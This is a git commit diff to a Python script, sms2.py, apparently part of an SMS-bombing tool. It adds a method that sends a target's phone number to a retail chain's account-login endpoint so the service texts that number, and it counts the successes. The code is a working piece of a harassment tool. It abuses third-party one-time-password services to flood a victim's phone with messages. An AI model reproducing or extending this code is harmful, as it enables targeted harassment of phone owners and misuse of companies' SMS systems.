e67b6107e5c0d81049009a0412c7cebf2b65199f
Efesploits <97785510+Efesploits@users.noreply.github.com>
2024-02-09 04:34:30 +0300

    Update sms2.py

--- sms2.py
+++ sms2.py
@@ -130,5 +130,16 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> BİR DAHAKİNDE OLUR")
-            
+
+    #bim
+    def Bim(self):
+        try:
+            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
+            if bim.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
 
